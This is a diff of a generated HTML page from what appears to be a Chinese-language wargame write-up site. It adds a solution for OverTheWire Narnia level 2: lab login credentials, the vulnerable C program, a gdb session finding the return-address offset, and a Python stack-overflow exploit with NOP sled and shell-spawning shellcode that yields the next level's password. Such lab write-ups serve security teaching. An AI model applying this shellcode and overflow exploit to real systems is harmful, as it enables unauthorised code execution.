@@ -2348,6 +2348,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    Level 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Level 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2636,6 +2656,26 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    Level 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Level 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2762,13 +2802,89 @@ $<span class="w"> </span>cat<span class="w"> </span>/etc/narnia_pass/narnia2
 Zzb6MIyceT
 $<span class="w"> </span><span class="nb">exit</span>
 </code></pre></div>
+<h2 id="level-2">Level 2<a class="headerlink" href="#level-2" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>narnia2</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>Zzb6MIyceT</td>
+  </tr>
+</tbody>
+</table>
+
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>narnia2@narnia.labs.overthewire.org<span class="w"> </span>-p<span class="w"> </span><span class="m">2226</span>
+$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/narnia/
+$<span class="w"> </span>cat<span class="w"> </span>narnia2.c
+<span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;string.h&gt;</span>
+<span class="c1">#include &lt;stdlib.h&gt;</span>
+
+int<span class="w"> </span>main<span class="o">(</span>int<span class="w"> </span>argc,<span class="w"> </span>char<span class="w"> </span>*<span class="w"> </span>argv<span class="o">[]){</span>
+<span class="w">    </span>char<span class="w"> </span>buf<span class="o">[</span><span class="m">128</span><span class="o">]</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="o">(</span><span class="nv">argc</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">1</span><span class="o">){</span>
+<span class="w">        </span>printf<span class="o">(</span><span class="s2">&quot;Usage: %s argument\n&quot;</span>,<span class="w"> </span>argv<span class="o">[</span><span class="m">0</span><span class="o">])</span><span class="p">;</span>
+<span class="w">        </span>exit<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">    </span>strcpy<span class="o">(</span>buf,<span class="w"> </span>argv<span class="o">[</span><span class="m">1</span><span class="o">])</span><span class="p">;</span>
+<span class="w">    </span>printf<span class="o">(</span><span class="s2">&quot;%s&quot;</span>,<span class="w"> </span>buf<span class="o">)</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="c1"># 确定可以控制 EIP 的溢出点</span>
+$<span class="w"> </span>gdb<span class="w"> </span>./narnia2
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x080491e8<span class="w"> </span><span class="c1"># main ret</span>
+Breakpoint<span class="w"> </span><span class="m">2</span><span class="w"> </span>at<span class="w"> </span>0x80491e8
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>definition<span class="w"> </span>of<span class="w"> </span><span class="s2">&quot;hook-stop&quot;</span>.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;x/1i<span class="w"> </span><span class="nv">$eip</span>
+&gt;x/8wx<span class="w"> </span><span class="nv">$esp</span>
+&gt;end
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="sb">`</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;&#39;.join([chr(i) * 4 for i in range(32, 96)]))&quot;</span><span class="sb">`</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/narnia/narnia2<span class="w"> </span><span class="sb">`</span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(&#39;&#39;.join([chr(i) * 4 for i in range(32, 96)]))&quot;</span><span class="sb">`</span>
+<span class="o">[</span>Thread<span class="w"> </span>debugging<span class="w"> </span>using<span class="w"> </span>libthread_db<span class="w"> </span>enabled<span class="o">]</span>
+Using<span class="w"> </span>host<span class="w"> </span>libthread_db<span class="w"> </span>library<span class="w"> </span><span class="s2">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.
+<span class="o">=</span>&gt;<span class="w"> </span>0x80491e8<span class="w"> </span>&lt;main+82&gt;:<span class="w"> </span>ret<span class="w">    </span>
+0xffffd31c:<span class="w">     </span>0x42424242<span class="w">      </span>0x43434343<span class="w">      </span>0x44444444<span class="w">      </span>0x45454545
+0xffffd32c:<span class="w">     </span>0x46464646<span class="w">      </span>0x47474747<span class="w">      </span>0x48484848<span class="w">      </span>0x49494949
+
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080491e8<span class="w"> </span><span class="k">in</span><span class="w"> </span>main<span class="w"> </span><span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
+Continuing.
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+<span class="o">=</span>&gt;<span class="w"> </span>0x42424242:<span class="w">  </span>Error<span class="w"> </span><span class="k">while</span><span class="w"> </span>running<span class="w"> </span>hook_stop:
+Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x42424242
+0x42424242<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="c1"># 0x42 - 32 = 34，EIP 在第 34 个</span>
+</code></pre></div>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">eip</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mh">0xffffd320</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>  <span class="c1"># 确保跳转在 NOP 中</span>
+<span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">96</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80</span><span class="s1">&#39;</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">33</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nop</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>/narnia/narnia2<span class="w"> </span><span class="sb">`</span>python3<span class="w"> </span>narnia2.py<span class="sb">`</span>
+$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">14003</span><span class="o">(</span>narnia3<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">14002</span><span class="o">(</span>narnia2<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">14002</span><span class="o">(</span>narnia2<span class="o">)</span>
+$<span class="w"> </span>cat<span class="w"> </span>/etc/narnia_pass/narnia3
+8SyQ2wyEDU
+$<span class="w"> </span><span class="nb">exit</span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">November 23, 2022 21:12:26</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">January 20, 2023 23:37:45</span>
       
     
   </small>
